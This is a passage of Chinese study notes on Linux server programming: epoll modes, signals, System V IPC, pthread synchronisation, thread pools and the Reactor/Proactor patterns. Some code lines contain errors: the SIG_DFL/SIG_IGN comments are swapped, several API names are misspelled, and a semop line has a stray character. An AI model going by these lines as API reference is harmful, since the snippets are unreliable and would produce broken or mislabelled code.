<span class="kt">int</span> <span class="nf">epoll_wait</span><span class="p">(</span><span class="kt">int</span> <span class="n">epfd</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">epoll_event</span> <span class="o">*</span><span class="n">events</span><span class="p">,</span><span class="kt">int</span> <span class="n">maxevents</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">);</span>
<span class="cm">/*
  epfd:epoll实例的文件描述符
  events：传出参数，根据epfd从内核事件表中把所有已就绪的事件复制到events结构体数组中
  maxevents：events结构体数组大小
  timeout：-1堵塞，大于等于0表示堵塞时间
*/</span>
</code></pre></div></div>

<p>epoll和poll最大  差异在于：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 索引poll返回的就绪文件描述符</span>
<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">poll</span><span class="p">(</span><span class="n">fds</span><span class="p">,</span> <span class="n">MAX_EVENT_NUMBER</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
<span class="c1">// 遍历</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_EVENT_NUMBER</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="n">POLLIN</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="c1">// 索引epoll返回的就绪文件描述符</span>
<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">epoll_wait</span><span class="p">(</span><span class="n">epoll_fd</span><span class="p">,</span> <span class="n">events</span><span class="p">,</span> <span class="n">MAX_EVENT_NUMBER</span><span class="p">,</span>  <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ret</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">events</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data</span><span class="p">.</span><span class="n">fd</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>epoll分LT（Level Trigger）和ET（Edge Trigger）两种模式，LT是默认模式，通知一个事件，程序可能不会马上处理完毕，那么下次还会通告此事件；ET是高效模式，只通知一次，所以必须做完。</p>

<p>对比LT和ET，对于BUFFER_SIZE只有10的情况：</p>

<p>LT：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002600.png" alt="image-20220425224459784" /></p>

<p>除去换行符出发了4次事件</p>

<p>ET：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002607.png" alt="image-20220425224728772" /></p>

<p>只触发了一次</p>

<h3 id="三组io复用的比较">三组I/O复用的比较</h3>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002603.png" alt="image-20220425225318528" /></p>

<h2 id="信号">信号</h2>

<blockquote>
  <p>信号是由用户、系统或者进程发送给用户进程的信息，以通知目标进程某个状态的改变或者系统异常</p>
</blockquote>

<p>Linu信号可由如下信号条件产生：</p>

<ul>
  <li>前台进程 <code class="language-plaintext highlighter-rouge">Ctrl+C</code>发送中断进程</li>
  <li>系统异常。比如浮点异常或者非法内存段异常。</li>
  <li>系统状态变化。比如alarm定时器引起SIGALRM信号。</li>
  <li>运行kill命令或调用kill函数</li>
</ul>

<p>发送信号：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">kill</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sig</span><span class="p">);</span>
<span class="cm">/*
  pid &gt; 0 发送给PID为pid标识的进程
  0 发送给本进程组的其他进程
  -1 发送给进程以外的所有进程, 但发送者需要有对目标进程发送信号的权限
  &lt; -1 发送给组ID为 -pid 的进程组中的所有成员

   出错信息 EINVAL 无效信号, EPERM 该进程没有权限给任何一个目标进程 ESRCH 目标进程(组) 不存在
   sig具体在bits/signum.h中
*/</span>
</code></pre></div></div>

<p>alarm定时器：使用<code class="language-plaintext highlighter-rouge">alarm</code>函数可设置可以定时器，在未来某个时间定时器会超时，产生<code class="language-plaintext highlighter-rouge">SIGALRM</code>信号，如果忽略或者不捕捉信号，默认动作是终止调用该<code class="language-plaintext highlighter-rouge">alarm</code>函数的进程。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">alarm</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seconds</span><span class="p">);</span>
</code></pre></div></div>

<p>信号处理方式：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 忽略目标信号</span>
<span class="cp">#define SIG_DFL ((_sighandler_t) 0)
</span><span class="c1">// 使用信号的默认处理方式</span>
<span class="cp">#define SIG_IGN ((_sighandler_t) 1)
</span>
<span class="c1">//为单独的信号设置处理函数</span>
<span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
</span><span class="c1">// _handler 指定sig的处理函数</span>
<span class="n">_sighandler_t</span> <span class="nf">signal</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">,</span> <span class="n">__sighandler_t</span> <span class="n">_handler</span><span class="p">)</span>

<span class="kt">int</span> <span class="n">sigaction</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">sigaction</span><span class="o">*</span> <span class="n">act</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">sigaction</span><span class="o">*</span> <span class="n">oact</span><span class="p">);</span>
<span class="c1">//一个例子</span>
<span class="kt">void</span> <span class="nf">addsig</span><span class="p">(</span> <span class="kt">int</span> <span class="n">sig</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">sigaction</span> <span class="n">sa</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">sa</span> <span class="p">)</span> <span class="p">);</span>
    <span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">sig_handler</span><span class="p">;</span>
    <span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">|=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
    <span class="n">sigfillset</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span> <span class="p">);</span>
    <span class="n">assert</span><span class="p">(</span> <span class="n">sigaction</span><span class="p">(</span> <span class="n">sig</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>## 定时器</p>

<h3 id="基于升序链表的计时器">基于升序链表的计时器</h3>

<p>详情见<a href="https://github.com/raichen/LinuxServerCodes/blob/master/11/11-2lst_timer.h">书籍源码</a>，升序链表可按照活动时间排序，核心是一个心搏函数，每隔一段时间检测到期的任务。</p>

<h3 id="时间轮-and-时间堆">时间轮 And 时间堆</h3>

<p>🐦🐦🐦</p>

<h2 id="多进程编程">多进程编程</h2>

<p>基础api..：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fork</span><span class="p">;</span>
<span class="n">exec</span><span class="p">;</span>
<span class="n">exit</span><span class="p">;</span>
<span class="n">wait</span><span class="p">;</span>
<span class="n">waitpid</span><span class="p">;</span>
<span class="n">chdir</span><span class="p">;</span><span class="c1">//修改当前工作目录</span>
</code></pre></div></div>

<h3 id="进程间通信inter-process-communicationipc">进程间通信（Inter-Process Communication，IPC）</h3>

<h4 id="管道-pipe">管道 Pipe</h4>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002612.png" alt="image-20220430153557938" /></p>

<p>管道本身是单向的，可以用两个管道实现双向传输，也可以使用<code class="language-plaintext highlighter-rouge">socketpair</code>来创建双向管道。</p>

<h4 id="信号量-semophore">信号量 semophore</h4>

<p>主要用作进程同步，以确保某一时刻只有一个进程可以拥有资源的独占式访问。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. 创建信号量</span>
<span class="c1">//创建一个全局唯一的信号量集, 或者获取一个已经存在的信号量集</span>
<span class="kt">int</span> <span class="nf">semget</span><span class="p">(</span><span class="n">key_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">int</span> <span class="n">num_sems</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sem_flags</span><span class="p">);</span>
<span class="cm">/*
  key:所创建信号集的键值，需要时唯一的非整数
  num_sens:创建的信号集中的信号量个数，一般为1，若是获取一个已经存在的集合，则为0
  sem_flags:0666|IPC_CREAT、 IPC_EXCL
*/</span>

<span class="c1">//2. 信号量初始化</span>
<span class="kt">int</span> <span class="nf">semctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">sem_id</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sem_num</span><span class="p">,</span> <span class="kt">int</span> <span class="n">command</span><span class="p">,</span> <span class="p">...);</span>
<span class="cm">/*
  sem_id:semget所返回的信号量标识符
  sem_num:被操作信号量在信号集中的编号
  command:如下图
  ...:command所需的参数，联合数据类型
*/</span>
<span class="k">union</span> <span class="n">semun</span>
<span class="p">{</span>
	<span class="kt">int</span>              <span class="n">val</span><span class="p">;</span>    <span class="cm">/* Value for SETVAL */</span>
	<span class="k">struct</span> <span class="nc">semid_ds</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>    <span class="cm">/* Buffer for IPC_STAT, IPC_SET */</span>
	<span class="kt">unsigned</span> <span class="kt">short</span>  <span class="o">*</span><span class="n">array</span><span class="p">;</span>  <span class="cm">/* Array for GETALL, SETALL */</span>
	<span class="k">struct</span> <span class="nc">seminfo</span>  <span class="o">*</span><span class="n">__buf</span><span class="p">;</span>  <span class="cm">/* Buffer for IPC_INFO
								(Linux-specific) */</span>
<span class="p">};</span>
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002616.png" alt="image-20220430182402389" /></p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//3. 操作信号量(PV)</span>
<span class="kt">void</span> <span class="nf">pv</span><span class="p">(</span><span class="kt">int</span> <span class="n">sem_id</span><span class="p">,</span><span class="kt">int</span> <span class="n">op</span><span class="p">){</span>
    <span class="k">struct</span> <span class="nc">sembuf</span> <span class="n">sem_b</span><span class="p">;</span>
    <span class="n">sem_b</span><span class="p">.</span><span class="n">sem_num</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="c1">//信号量编号</span>
    <span class="n">sem_b</span><span class="p">.</span><span class="n">sem_op</span><span class="o">=</span><span class="n">op</span><span class="p">;</span> <span class="c1">//-1为P操作，1为V操作</span>
    <span class="n">sem_b</span><span class="p">.</span><span class="n">sem_flg</span><span class="o">=</span><span class="n">SEM_UNDO</span><span class="p">;</span>
    <span class="c1">// IPC_NOWAIT 无论信号量操作是否成功, 都立即返回</span>
	<span class="c1">// SEM_UNDO当进程退出的时候, 取消正在进行的semop操作 PV操作系统更新进程的semadj变量</span>
    <span class="n">semop</span><span class="p">(</span><span class="n">sem_id</span><span class="p">,</span><span class="o">&amp;</span><span class="n">sem_b</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="n">m</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="消息队列-message-queue">消息队列 message queue</h4>

<p>主要用作进程间传递消息。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. 创建消息队列</span>
<span class="kt">int</span> <span class="nf">msgget</span><span class="p">(</span><span class="n">key_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">int</span> <span class="n">msgflg</span><span class="p">);</span><span class="c1">//和semget类似，成功返回标识符</span>

<span class="c1">//2. 发送消息</span>
<span class="c1">//成功返回0，失败返回-1</span>
<span class="kt">int</span> <span class="nf">msgsnd</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">msg_ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">msg_sz</span><span class="p">,</span> <span class="kt">int</span> <span class="n">msgflg</span><span class="p">);</span>
<span class="cm">/*
  msqid:消息队列标识符
  msg_ptr:将发往消息队列的消息结构体指针，结构为：
  struct msg_st{
    long  msg_type;     //消息类型，用户自定义,接收方会根据类型选择接受
    char text[BUFSIZ];  //发送的消息，不一定是char
};
  msg_sz:消息结构体中待传输数据的大小
  msgflag:IPC_NOTWAIT(消息队列满时返回-1)、0(消息队列满时堵塞)
  
*/</span>
<span class="c1">//3. 接受消息</span>
<span class="kt">int</span> <span class="nf">msgrcv</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">msg_ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">msg_sz</span><span class="p">,</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">msgtype</span><span class="p">,</span> <span class="kt">int</span> <span class="n">msgflg</span><span class="p">);</span>
<span class="cm">/*
  除了msgtype，其他四个参数同msgsnd
  msgtype：
    msgtype = 0 读取消息队列第一个消息
    msgtype &gt; 0 读取消息队列第一个类型是msgtype的消息 除非标志了MSG_EXCEPT
    msgtype &lt; 0 读取第一个 类型值 &lt; abs(msgtype)的消息
*/</span>

<span class="c1">//4. 控制消息队列</span>
<span class="kt">int</span> <span class="nf">msgctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="kt">int</span> <span class="n">command</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">msqid_ds</span> <span class="o">*</span><span class="n">buf</span><span class="p">);</span>
<span class="cm">/*
  msqid:消息队列标识符
  command:
    PC_STAT 复制消息队列关联的数据结构存储在buf中
    IPC_SET 将buf中的部分成员更新到目标的内核数据
    IPC_RMID 立即移除消息队列, 唤醒所有等待读消息和写消息的进程
  msqid_ds:如下图
*/</span>
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002620.png" alt="image-20220501165712574" /></p>

<h4 id="共享内存-shared-memory">共享内存 shared memory</h4>

<p>🐦🐦🐦</p>

<h2 id="多线程编程">多线程编程</h2>

<h3 id="线程api">线程API</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. 创建线程</span>
<span class="err">成功返回</span><span class="mi">0</span><span class="err">，失败返回错误码</span>
<span class="kt">int</span> <span class="nf">pthread_create</span><span class="p">(</span><span class="n">pthread_t</span><span class="o">*</span> <span class="kr">thread</span><span class="p">,</span> <span class="k">const</span> <span class="n">pthread_attr_t</span><span class="o">*</span> <span class="n">attr</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">start_routine</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">),</span> <span class="kt">void</span><span class="o">*</span> <span class="n">arg</span><span class="p">);</span>

<span class="c1">//2. 退出线程</span>
<span class="kt">void</span> <span class="nf">pthread_exit</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">retval</span><span class="p">);</span>

<span class="c1">//3. 回收(等待)线程，类似进程中的waitpid</span>
<span class="c1">//成功时返回0, 失败返回错误码</span>
<span class="kt">int</span> <span class="nf">pthread_join</span><span class="p">(</span><span class="n">pthread_t</span> <span class="kr">thread</span><span class="p">,</span> <span class="kt">void</span><span class="o">**</span> <span class="n">retval</span><span class="p">);</span>

<span class="c1">//4. 终止线程</span>
<span class="c1">//成功时返回0, 失败返回错误码</span>
<span class="kt">int</span> <span class="n">pthread_cancel</span><span class="p">(</span><span class="n">pthread_t</span> <span class="kr">thread</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="多线程同步">多线程同步</h3>

<h4 id="互斥量">互斥量</h4>

<p>互斥量主要用于同步线程对共享数据的访问。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 初始化互斥锁</span>
<span class="c1">// 第一个参数指向目标互斥锁, 第二个参数指定属性 nullptr则为默认</span>
<span class="kt">int</span> <span class="nf">pthread_mutex_init</span><span class="p">(</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">,</span> <span class="k">const</span> <span class="n">pthread_mutexattr_t</span> <span class="o">*</span><span class="n">mutexattr</span><span class="p">);</span>

<span class="c1">// 销毁目标互斥锁</span>
<span class="kt">int</span> <span class="nf">pthread_mutex_destory</span><span class="p">(</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">);</span>

<span class="c1">// 针对普通锁加锁</span>
<span class="kt">int</span> <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">);</span>

<span class="c1">// 针对普通锁立即返回 目标未加锁则加锁 如果已经加锁则返回错误码EBUSY</span>
<span class="kt">int</span> <span class="nf">pthread_mutex_trylock</span><span class="p">(</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">);</span>

<span class="c1">// 解锁 如果有其他线程在等待这个互斥锁, 则其中之一获得</span>
<span class="kt">int</span> <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">);</span>
</code></pre></div></div>

<h4 id="条件变量">条件变量</h4>

<p>条件变量主要用于线程之间同步共享数据的值，条件变量提供了一种线程间的通知机制，当某个共享数据达到某个值时，唤醒等待这个共享数据的线程。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//初始化条件变量</span>
<span class="kt">int</span> <span class="nf">pthread_cond_init</span><span class="p">(</span><span class="n">pthread_cond_t</span> <span class="o">*</span><span class="n">cond</span><span class="p">,</span> <span class="k">const</span> <span class="n">pthread_condattr</span> <span class="o">*</span><span class="n">cond_attr</span><span class="p">);</span>
<span class="c1">//下述相当于初始化一个字段全为空的条件变量</span>
<span class="n">pthread_cond_t</span> <span class="n">cond</span> <span class="o">=</span> <span class="n">PTHREAD_COND_INITIALIZER</span><span class="p">;</span>

<span class="c1">// 销毁一个正在被等待的条件变量 将会失败并返回EBUSY</span>
<span class="kt">int</span> <span class="nf">pthread_cont_destory</span><span class="p">(</span><span class="n">pthread_cond_t</span> <span class="o">*</span><span class="n">cond</span><span class="p">);</span>

<span class="c1">// 广播式的唤醒所有等待目标条件变量的线程</span>
<span class="kt">int</span> <span class="nf">pthread_cont_broadcast</span><span class="p">(</span><span class="n">pthread_cond_t</span> <span class="o">*</span><span class="n">cond</span><span class="p">);</span>

<span class="c1">// 唤醒一个等待目标条件变量的线程</span>
<span class="kt">int</span> <span class="nf">pthread_cond_signal</span><span class="p">(</span><span class="n">pthread_cond_t</span> <span class="o">*</span><span class="n">cond</span><span class="p">);</span>

<span class="c1">// 等待目标条件变量</span>
<span class="kt">int</span> <span class="nf">pthread_cond_wait</span><span class="p">(</span><span class="n">pthread_cond_t</span> <span class="o">*</span><span class="n">cond</span><span class="p">,</span> <span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">);</span>
</code></pre></div></div>

<h4 id="posix-信号量">POSIX 信号量</h4>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;semaphore&gt;</span><span class="cp">
</span><span class="c1">//创建信号量</span>
<span class="kt">int</span> <span class="n">sem_init</span><span class="p">(</span><span class="n">sem_t</span><span class="o">*</span> <span class="n">sem</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pshared</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">value</span><span class="p">)</span>
<span class="cm">/*
  sem:初始化的信号量
  pshared为0表示是当前进程的局部信号量, 否则信号量可以在多个进程间共享
  value:信号量的初始值，设置为1可以当锁使用
*/</span>
<span class="c1">// 销毁信号量, 释放其占用的系统资源</span>
<span class="kt">int</span> <span class="n">sem_destory</span><span class="p">(</span><span class="n">sem_t</span><span class="o">*</span> <span class="n">sem</span><span class="p">)</span>

<span class="c1">// 以原子操作的形式将信号量的值 -1, 如果信号量的值为0, 则sem_wait将被阻塞直到sem_wait具有非0值 p操作</span>
<span class="kt">int</span> <span class="n">sem_wait</span><span class="p">(</span><span class="n">sem_t</span><span class="o">*</span> <span class="n">sem</span><span class="p">)</span>

<span class="c1">// 跟上面的函数相同不过不会阻塞. 信号量不为0则减一操作, 为0则返回-1 errno</span>
<span class="kt">int</span> <span class="n">sem_trywait</span><span class="p">(</span><span class="n">sem_t</span><span class="o">*</span> <span class="n">sem</span><span class="p">)</span>

<span class="c1">// 原子操作将信号量的值 +1 v操作</span>
<span class="kt">int</span> <span class="n">sem_post</span><span class="p">(</span><span class="n">sem_t</span><span class="o">*</span> <span class="n">sem</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="进程池和线程池">进程池和线程池</h2>

<p>进程池和线程池类似，基本上完全适用。</p>

<p>线程池就是服务器预先创建的一组子线程，线程池中的所有子线程都运行着相同的代码。当有新的任务到来时，主线程将通过某种方式选择线程池中的某一个子线程来为之服务。相比与动态的创建子线程，选择一个已经存在的子线程的代价显然要小得多。</p>

<ol>
  <li>
    <p>主线程使用某种算法来主动选择子线程。最简单、最常用的算法是随机算法和 Round Robin(轮流 选取)算法，但更优秀、更智能的算法将使任务在各个工作线程中更均匀地分配，从而减轻服务器的整体压力。</p>
  </li>
  <li>
    <p>主线程和所有子线程通过一个共享的工作队列来同步，子线程都睡眠在该工作队列上。当有新的任务到来时，主线程将任务添加到工作队列中。这将唤醒正在等待任务的子线程，不过只有一个子线程将获得新任务的”接管权“，它可以从工作队列中取出任务并执行之，而其他子线程将继续睡眠在工作队列上。</p>
  </li>
</ol>

<p>这感觉上其实和golang的channel+ select机制差不多，实际上我后续在这里的写法就是仿照go的模式来写的。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002626.png" alt="image-20220508001617260" /></p>

<h2 id="高性能服务器程序框架">高性能服务器程序框架</h2>

<p>书上把这一章内容放在了I/O复用之前，这是我没想到的。</p>

<h3 id="服务器基础框架">服务器基础框架</h3>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002631.png" alt="image-20220505190335651" /></p>

<table>
  <thead>
    <tr>
      <th>模块</th>
      <th>功能</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>I/O处理单元</td>
      <td>处理客户连接，读写网络数据</td>
    </tr>
    <tr>
      <td>请求队列</td>
      <td>各个单元之间的通信方式</td>
    </tr>
    <tr>
      <td>逻辑单元</td>
      <td>业务进程或线程</td>
    </tr>
    <tr>
      <td>网络存储单元</td>
      <td>本地数据库、文件或者缓存</td>
    </tr>
  </tbody>
</table>

<p><strong>I/O 处理单元</strong>是服务器管理客户连接的模块。它通常要完成以下工作：等待并接受新的客户连接，接收客户数据，将服务器响应数据返回给客户端。数据的收发不一定在 I/O 处理单元中执行，也可能在逻辑单元中执行，具体在何处执行取决于<strong>事件处理模式</strong>。</p>

<p><strong>请求队列</strong>是各个单元之间通信方式的抽象。请求队列通常被实现为<strong>池</strong>的一部分。</p>

<p><strong>逻辑单元</strong>通常是一个进程或线程。它分析并处理客户数据，然后将结果传递给 I/O 处理单元或者直接发送给客户（具体使用哪种方式取决于事件处理模式）。服务器通常拥有多个逻辑单元，以实现对多个客户任务的并发处理。</p>

<p><strong>网络存储单元</strong>可以是数据库、缓存和文件。</p>

<h3 id="事件处理模式">事件处理模式</h3>

<p>服务器程序通常需要处理三类事件：I/O 事件、信号及定时事件。有两种高效的事件处理模式：<strong>Reactor</strong> 和 <strong>Proactor</strong>。</p>

<h4 id="reactor模式">Reactor模式</h4>

<blockquote>
  <p>Reactor模式要求主线程（I/O处理单元）只负责监听文件描述符上是否有事件发生，有的话就立即将该事件通知工作</p>

  <p>线程（逻辑单元），将 socket 可读可写事件放入请求队列，交给工作线程处理。除此之外，主线程不做</p>

  <p>任何其他实质性的工作。读写数据，接受新的连接，以及处理客户请求均在工作线程中完成。</p>
</blockquote>

<p>使用同步 I/O（以 epoll_wait 为例）实现的 Reactor 模式的工作流程是：</p>
<ol>
  <li>主线程往 epoll 内核事件表中注册 socket 上的读就绪事件。</li>
  <li>主线程调用 <code class="language-plaintext highlighter-rouge">epoll_wait</code> 等待 socket 上有数据可读。</li>
  <li>当 socket 上有数据可读时， <code class="language-plaintext highlighter-rouge">epoll_wait</code> 通知主线程。主线程则将 socket 可读事件放入请求队列。</li>
  <li>睡眠在请求队列上的某个工作线程被唤醒，它从 socket 读取数据，并处理客户请求，然后往 epoll
内核事件表中注册该 socket 上的写就绪事件。</li>
  <li>当主线程调用 <code class="language-plaintext highlighter-rouge">epoll_wait</code> 等待 socket 可写。</li>
  <li>当 socket 可写时，<code class="language-plaintext highlighter-rouge">epoll_wait</code> 通知主线程。主线程将 socket 可写事件放入请求队列。</li>
  <li>睡眠在请求队列上的某个工作线程被唤醒，它往 socket 上写入服务器处理客户请求的结果。</li>
</ol>

<p>Reactor 模式的工作流程图：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002636.png" alt="image-20220505191735615" /></p>

<h4 id="proactor模式">Proactor模式</h4>

<blockquote>
  <p>Proactor 模式将所有 I/O 操作都交给主线程和内核来处理（进行读、写），工作线程仅仅负责业务逻</p>

  <p>辑。使用异步 I/O 模型（以 aio_read 和 aio_write 为例）实现的 Proactor 模式的工作流程是：</p>
</blockquote>

<ol>
  <li>主线程调用 aio_read 函数向内核注册 socket 上的读完成事件，并告诉内核用户读缓冲区的位置，
以及读操作完成时如何通知应用程序（这里以信号为例）。</li>
  <li>主线程继续处理其他逻辑。</li>
  <li>当 socket 上的数据被读入用户缓冲区后，内核将向应用程序发送一个信号，以通知应用程序数据
已经可用。</li>
  <li>应用程序预先定义好的信号处理函数选择一个工作线程来处理客户请求。工作线程处理完客户请求
后，调用 aio_write 函数向内核注册 socket 上的写完成事件，并告诉内核用户写缓冲区的位置，以
及写操作完成时如何通知应用程序。</li>
  <li>主线程继续处理其他逻辑。</li>
  <li>当用户缓冲区的数据被写入 socket 之后，内核将向应用程序发送一个信号，以通知应用程序数据
已经发送完毕。</li>
  <li>应用程序预先定义好的信号处理函数选择一个工作线程来做善后处理，比如决定是否关闭 socket。</li>
</ol>

<p>Proactor 模式的工作流程图：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002645.png" alt="image-20220505213405420" /></p>

<h4 id="同步方式的proactor">同步方式的Proactor</h4>

<p>上述所说的Proactor模式需要异步I/O接口，下述使用同步方式模拟：</p>

<ol>
  <li>主线程往 epoll 内核事件表中注册 socket 上的读就绪事件。</li>
  <li>主线程调用 epoll_wait 等待 socket 上有数据可读。</li>
  <li>当 socket 上有数据可读时，epoll_wait 通知主线程。主线程从 socket 循环读取数据，直到没有更
多数据可读，然后将读取到的数据封装成一个请求对象并插入请求队列。</li>
  <li>睡眠在请求队列上的某个工作线程被唤醒，它获得请求对象并处理客户请求，然后往 epoll 内核事
件表中注册 socket 上的写就绪事件。</li>
  <li>主线程调用 epoll_wait 等待 socket 可写。</li>
  <li>当 socket 可写时，epoll_wait 通知主线程。主线程往 socket 上写入服务器处理客户请求的结果。</li>
</ol>

<p>同步 I/O 模拟 Proactor 模式的工作流程：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002642.png" alt="image-20220506142214571" /></p>

